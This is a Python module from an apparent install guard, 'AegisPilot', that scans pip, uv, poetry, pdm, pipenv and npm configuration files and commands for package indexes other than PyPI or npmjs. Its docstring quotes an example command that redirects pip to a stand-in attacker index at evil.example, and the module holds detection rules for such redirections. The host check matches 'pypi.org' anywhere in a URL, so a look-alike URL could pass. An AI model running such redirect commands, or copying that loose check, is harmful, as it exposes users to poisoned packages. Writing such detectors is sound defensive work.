"""
AegisPilot - package indexes set in configuration files.

The guard always scans what PyPI serves. When a configuration file sends the installer somewhere else, the scan is of
the wrong file: `pip config set global.index-url https://evil.example/simple` passed the guard, and every later
`pip install requests` then scanned PyPI's requests while pip installed the other index's one. Command-line flags and
environment variables were already handled (install_parse); this reads the files the tools themselves read.

  pip      site (/etc/pip.conf, /etc/xdg/pip/pip.conf), user (~/.config/pip/pip.conf, ~/.pip/pip.conf), the active
           virtualenv's pip.conf and the project's .venv/pip.conf: index-url, extra-index-url, find-links
  uv       /etc/uv/uv.toml, ~/.config/uv/uv.toml, uv.toml and pyproject.toml [tool.uv] of the project:
           index-url, extra-index-url, find-links, [[index]] url
  poetry   pyproject.toml [[tool.poetry.source]] url
  pdm      pyproject.toml [[tool.pdm.source]] url
  pipenv   Pipfile [[source]] url

Only the files of the tool that runs the install are read (a poetry source does not change what pip installs).
Nothing here decides alone: every finding becomes an "unscanned source" (REVIEW), like --index-url on the command line.
"""
from __future__ import annotations

import configparser
import os
import re
import tomllib
from pathlib import Path

PYPI_HOSTS = ("pypi.org", "files.pythonhosted.org")
MAX_CONFIG_BYTES = 256 * 1024
_PIP_KEYS = ("index-url", "extra-index-url", "find-links")
_PIP_SECTIONS = ("global", "install", "download")


def _is_pypi(url: str) -> bool:
    return any(h in url for h in PYPI_HOSTS)


def _read(path: Path) -> str | None:
    try:
        if path.is_file() and path.stat().st_size <= MAX_CONFIG_BYTES:
            return path.read_text(errors="replace")
    except OSError:
        pass
    return None


def _shown(path: Path, home: Path) -> str:
    try:
        return "~/" + str(path.relative_to(home))
    except ValueError:
        return str(path)


def _pip_text(text: str, shown: str) -> list[tuple[str, str, str]]:
    cp = configparser.ConfigParser(interpolation=None, strict=False)
    try:
        cp.read_string(text)
    except configparser.Error:
        return [("custom_index", shown, "could not read the pip config file, so where packages come from is unknown")]
    out = []
    for sec in _PIP_SECTIONS:
        if not cp.has_section(sec):
            continue
        for key in _PIP_KEYS:
            for url in (cp.get(sec, key, fallback="") or "").split():
                if key == "find-links":
                    out.append(("find_links", f"{shown}: {key} = {url}", "find-links sources in the pip config are not scanned"))
                elif not _is_pypi(url):
                    out.append(("custom_index", f"{shown}: {key} = {url}", "pip config file makes installs download from an index other than PyPI"))
    return out


def _pip(project: Path | None, env: dict, home: Path) -> list[tuple[str, str, str]]:
    files = [Path("/etc/pip.conf"), Path("/etc/xdg/pip/pip.conf"), home / ".config/pip/pip.conf", home / ".pip/pip.conf"]
    if env.get("VIRTUAL_ENV"):
        files.append(Path(env["VIRTUAL_ENV"]) / "pip.conf")
    if project is not None:
        files.append(project / ".venv" / "pip.conf")
    out = []
    for f in files:
        text = _read(f)
        if text is not None:
            out += _pip_text(text, _shown(f, home))
    return out


def _toml_text(text: str) -> dict:
    try:
        return tomllib.loads(text)
    except (tomllib.TOMLDecodeError, ValueError):
        return {"__unreadable__": True}


def _toml(path: Path) -> dict | None:
    text = _read(path)
    return None if text is None else _toml_text(text)


def _uv_settings(doc: dict, where: str) -> list[tuple[str, str, str]]:
    out = []
    for key in ("index-url", "extra-index-url"):
        vals = doc.get(key)
        for url in ([vals] if isinstance(vals, str) else vals or []):
            if isinstance(url, str) and not _is_pypi(url):
                out.append(("custom_index", f"{where}: {key} = {url}", "uv config makes installs download from an index other than PyPI"))
    vals = doc.get("find-links")
    for url in ([vals] if isinstance(vals, str) else vals or []):
        out.append(("find_links", f"{where}: find-links = {url}", "find-links sources in the uv config are not scanned"))
    for idx in doc.get("index") or []:
        url = idx.get("url", "") if isinstance(idx, dict) else ""
        if url and not _is_pypi(url):
            out.append(("custom_index", f"{where}: index {idx.get('name', '')} = {url}", "uv config makes installs download from an index other than PyPI"))
    return out


def _uv(project: Path | None, env: dict, home: Path) -> list[tuple[str, str, str]]:
    out = []
    files = [(Path("/etc/uv/uv.toml"), None), (home / ".config/uv/uv.toml", None)]
    if project is not None:
        files += [(project / "uv.toml", None), (project / "pyproject.toml", ("tool", "uv"))]
    for f, table in files:
        doc = _toml(f)
        if doc is None:
            continue
        if doc.get("__unreadable__"):
            out.append(("custom_index", _shown(f, home), "could not read the uv config file, so where packages come from is unknown"))
            continue
        for part in table or ():
            doc = doc.get(part) or {}
        out += _uv_settings(doc, _shown(f, home))
    return out


def _source_list(doc: dict, table: tuple, file: str, tool: str) -> list[tuple[str, str, str]]:
    for part in table[:-1]:
        doc = doc.get(part) or {}
    out = []
    for src in doc.get(table[-1]) or []:
        url = src.get("url", "") if isinstance(src, dict) else ""
        if url and not _is_pypi(url):
            out.append(("custom_index", f"{file}: {tool} source {src.get('name', '')} = {url}", f"{tool} config makes installs download from an index other than PyPI"))
    return out


def _sources(project: Path | None, home: Path, file: str, table: tuple, tool: str) -> list[tuple[str, str, str]]:
    if project is None:
        return []
    doc = _toml(project / file)
    if not doc or doc.get("__unreadable__"):
        return []
    return _source_list(doc, table, file, tool)


def findings(tools: set[str], project: Path | None, env: dict | None = None, home: Path | None = None) -> list[tuple[str, str, str]]:
    """(kind, text, reason) for each configured index that is not PyPI, for the tools that run this install."""
    env = env if env is not None else dict(os.environ)
    home = home if home is not None else Path(env.get("HOME") or Path.home())
    out: list[tuple[str, str, str]] = []
    if "pip" in tools:
        out += _pip(project, env, home)
    if "uv" in tools:
        out += _uv(project, env, home)
    if "poetry" in tools:
        out += _sources(project, home, "pyproject.toml", ("tool", "poetry", "source"), "poetry")
    if "pdm" in tools:
        out += _sources(project, home, "pyproject.toml", ("tool", "pdm", "source"), "pdm")
    if "pipenv" in tools:
        out += _sources(project, home, "Pipfile", ("source",), "pipenv")
    seen, unique = set(), []
    for item in out:
        if item not in seen:
            seen.add(item)
            unique.append(item)
    return unique


# commands that change where later installs come from
_CONFIG_KEYS = ("index-url", "index_url", "extra-index-url", "extra_index_url", "find-links", "find_links", "trusted-host")


def config_command(toks: list[str]) -> str | None:
    """Why this command redirects later installs, or None: `pip config set global.index-url URL`, `pip config edit`,
    `poetry source add NAME URL`, `poetry config repositories.X URL`, `pdm config pypi.url URL`."""
    if not toks:
        return None
    first, rest = Path(toks[0]).name, toks[1:]
    if first.startswith("python") and rest[:2] == ["-m", "pip"]:
        first, rest = "pip", rest[2:]
    if re.fullmatch(r"pip(\d+(\.\d+)?)?", first) and "config" in rest[:3]:
        sub = rest[rest.index("config") + 1:]
        if sub[:1] == ["edit"]:
            return "edits the pip config file directly (the index may change)"
        if sub[:1] == ["set"] and any(k in " ".join(sub[1:2]) for k in _CONFIG_KEYS):
            return "changes the pip config so later installs download from elsewhere"
    if first == "poetry" and (rest[:2] == ["source", "add"] or (rest[:1] == ["config"] and any("repositories." in t for t in rest))):
        return "adds a package source to the poetry config"
    if first == "pdm" and rest[:1] == ["config"] and any(t.startswith("pypi.") and t.endswith("url") for t in rest):
        return "changes the index in the pdm config"
    if first in ("npm", "pnpm", "yarn"):
        key = rest[2] if rest[:2] == ["config", "set"] and len(rest) > 2 else rest[1] if rest[:1] == ["set"] and len(rest) > 1 else ""
        if re.search(r"(^|:)registry$", key.split("=")[0]):
            return "changes the registry in the npm config"
    return None


# the same files written with the agent's file tools (Edit/Write), judged on the text after the edit
_WATCHED_FILES = {"pip.conf": "pip", "pip.ini": "pip", "uv.toml": "uv", "pyproject.toml": "project", "Pipfile": "project",
                  ".npmrc": "npm"}


def _npmrc_text(text: str, shown: str) -> list[tuple[str, str, str]]:
    out = []
    for line in text.splitlines():
        m = re.match(r"^\s*(@[\w.-]+:)?registry\s*=\s*(\S+)", line)
        if m and "registry.npmjs.org" not in m.group(2):
            out.append(("custom_index", f"{shown}: {(m.group(1) or '')}registry = {m.group(2)}", "npm config makes installs download from a registry other than npmjs"))
    return out


def _text_findings(name: str, text: str) -> list[tuple[str, str, str]]:
    kind = _WATCHED_FILES[name]
    if kind == "pip":
        return _pip_text(text, name)
    if kind == "npm":
        return _npmrc_text(text, name)
    doc = _toml_text(text)
    if doc.get("__unreadable__"):          # a half-written pyproject.toml breaks every tool anyway; a config file is flagged
        return [] if kind == "project" else [("custom_index", name, "could not read the uv config file, so where packages come from is unknown")]
    if kind == "uv":
        return _uv_settings(doc, name)
    if name == "Pipfile":
        return _source_list(doc, ("source",), name, "pipenv")
    return (_uv_settings((doc.get("tool") or {}).get("uv") or {}, name)
            + _source_list(doc, ("tool", "poetry", "source"), name, "poetry")
            + _source_list(doc, ("tool", "pdm", "source"), name, "pdm"))


def is_watched_file(file_path: str) -> bool:
    return Path(file_path).name in _WATCHED_FILES


def written_file(file_path: str, new_text: str | None) -> list[tuple[str, str, str]]:
    """Package sources this write ADDS (kind, text, reason): the text after the edit against the file on disk, so a file
    that already had a private index is not flagged again on an unrelated edit. new_text None = the edit could not be
    derived: a pip/uv config is then flagged as unknown, a project file (edited all the time) is not."""
    name = Path(file_path).name
    if name not in _WATCHED_FILES:
        return []
    if new_text is None:
        if _WATCHED_FILES[name] == "project":
            return []
        return [("custom_index", name, "edits a package config file - the change could not be read (later installs may download from elsewhere)")]
    before = _read(Path(file_path))
    old = {(k, t) for k, t, _ in _text_findings(name, before)} if before is not None else set()
    return [f for f in _text_findings(name, new_text) if (f[0], f[1]) not in old]
